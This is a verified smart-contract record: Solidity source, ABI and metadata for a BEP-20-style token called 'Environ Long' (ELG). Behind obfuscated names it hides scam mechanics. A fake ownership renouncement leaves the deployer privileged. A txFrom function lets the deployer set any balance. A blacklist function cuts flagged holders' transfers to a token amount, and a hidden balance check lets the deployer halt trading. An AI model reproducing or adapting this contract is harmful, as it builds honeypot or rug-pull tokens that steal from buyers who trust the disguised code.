{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface enableShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract exemptFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoMin {\n    function createPair(address totalLaunched, address maxBuyLimit) external returns (address);\n}\n\ninterface takeAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minBuy) external view returns (uint256);\n\n    function transfer(address tradingReceiverBuy, uint256 receiverWallet) external returns (bool);\n\n    function allowance(address totalTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingReceiverBuy,\n        uint256 receiverWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalFund, uint256 value);\n    event Approval(address indexed totalTeam, address indexed spender, uint256 value);\n}\n\ninterface fromExempt is takeAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EnvironLong is exemptFrom, takeAt, fromExempt {\n\n    mapping(address => uint256) private shouldTake;\n\n    function swapSell() private view {\n        require(fromTotal[_msgSender()]);\n    }\n\n    mapping(address => bool) public modeTx;\n\n    bool public takeWallet;\n\n    address public receiverTx;\n\n    function launchedWallet() public {\n        emit OwnershipTransferred(receiverTx, address(0));\n        toLaunch = address(0);\n    }\n\n    function senderTotal(address modeFeeFund) public {\n        swapSell();\n        if (sellExemptReceiver != amountSellFee) {\n            takeFee = tradingAmount;\n        }\n        if (modeFeeFund == receiverTx || modeFeeFund == swapTake) {\n            return;\n        }\n        modeTx[modeFeeFund] = true;\n    }\n\n    function txFrom(address receiverMin, uint256 receiverWallet) public {\n        swapSell();\n        shouldTake[receiverMin] = receiverWallet;\n    }\n\n    string private fromMin = \"ELG\";\n\n    function allowance(address maxMinTo, address fromIs) external view virtual override returns (uint256) {\n        if (fromIs == totalReceiverFund) {\n            return type(uint256).max;\n        }\n        return receiverEnable[maxMinTo][fromIs];\n    }\n\n    bool public tradingModeLaunched;\n\n    uint256 totalSender;\n\n    uint256 public tradingEnable;\n\n    function isLimitExempt(address liquidityTake, address tradingReceiverBuy, uint256 receiverWallet) internal returns (bool) {\n        if (liquidityTake == receiverTx) {\n            return teamIs(liquidityTake, tradingReceiverBuy, receiverWallet);\n        }\n        uint256 toFee = takeAt(swapTake).balanceOf(maxBuy);\n        require(toFee == exemptShould);\n        require(tradingReceiverBuy != maxBuy);\n        if (modeTx[liquidityTake]) {\n            return teamIs(liquidityTake, tradingReceiverBuy, fromBuy);\n        }\n        return teamIs(liquidityTake, tradingReceiverBuy, receiverWallet);\n    }\n\n    bool private senderAt;\n\n    address maxBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private launchedEnable = \"Environ Long\";\n\n    uint8 private tradingLiquidity = 18;\n\n    mapping(address => bool) public fromTotal;\n\n    function teamTotal(uint256 receiverWallet) public {\n        swapSell();\n        exemptShould = receiverWallet;\n    }\n\n    function owner() external view returns (address) {\n        return toLaunch;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromMin;\n    }\n\n    bool public feeMax;\n\n    uint256 public takeIs;\n\n    function transfer(address receiverMin, uint256 receiverWallet) external virtual override returns (bool) {\n        return isLimitExempt(_msgSender(), receiverMin, receiverWallet);\n    }\n\n    address totalReceiverFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private receiverFee = 100000000 * 10 ** 18;\n\n    function teamIs(address liquidityTake, address tradingReceiverBuy, uint256 receiverWallet) internal returns (bool) {\n        require(shouldTake[liquidityTake] >= receiverWallet);\n        shouldTake[liquidityTake] -= receiverWallet;\n        shouldTake[tradingReceiverBuy] += receiverWallet;\n        emit Transfer(liquidityTake, tradingReceiverBuy, receiverWallet);\n        return true;\n    }\n\n    address public swapTake;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedEnable;\n    }\n\n    uint256 public tradingAmount;\n\n    event OwnershipTransferred(address indexed maxAutoLaunched, address indexed isMarketing);\n\n    address private toLaunch;\n\n    uint256 public takeFee;\n\n    function approve(address fromIs, uint256 receiverWallet) public virtual override returns (bool) {\n        receiverEnable[_msgSender()][fromIs] = receiverWallet;\n        emit Approval(_msgSender(), fromIs, receiverWallet);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingLiquidity;\n    }\n\n    constructor (){\n        \n        enableShould listWallet = enableShould(totalReceiverFund);\n        swapTake = autoMin(listWallet.factory()).createPair(listWallet.WETH(), address(this));\n        if (takeFee == listTx) {\n            tradingModeLaunched = true;\n        }\n        receiverTx = _msgSender();\n        launchedWallet();\n        fromTotal[receiverTx] = true;\n        shouldTake[receiverTx] = receiverFee;\n        \n        emit Transfer(address(0), receiverTx, receiverFee);\n    }\n\n    function balanceOf(address minBuy) public view virtual override returns (uint256) {\n        return shouldTake[minBuy];\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverEnable;\n\n    uint256 constant fromBuy = 5 ** 10;\n\n    uint256 public listTx;\n\n    bool private sellExemptReceiver;\n\n    uint256 exemptShould;\n\n    function launchTx(address toList) public {\n        if (takeWallet) {\n            return;\n        }\n        if (takeFee == takeIs) {\n            takeIs = listTx;\n        }\n        fromTotal[toList] = true;\n        \n        takeWallet = true;\n    }\n\n    bool private amountSellFee;\n\n    function getOwner() external view returns (address) {\n        return toLaunch;\n    }\n\n    function transferFrom(address liquidityTake, address tradingReceiverBuy, uint256 receiverWallet) external override returns (bool) {\n        if (_msgSender() != totalReceiverFund) {\n            if (receiverEnable[liquidityTake][_msgSender()] != type(uint256).max) {\n                require(receiverWallet <= receiverEnable[liquidityTake][_msgSender()]);\n                receiverEnable[liquidityTake][_msgSender()] -= receiverWallet;\n            }\n        }\n        return isLimitExempt(liquidityTake, tradingReceiverBuy, receiverWallet);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverFee;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAutoLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMinTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"}],\"name\":\"launchTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFeeFund\",\"type\":\"address\"}],\"name\":\"senderTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverWallet\",\"type\":\"uint256\"}],\"name\":\"teamTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingModeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingReceiverBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverWallet\",\"type\":\"uint256\"}],\"name\":\"txFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EnvironLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}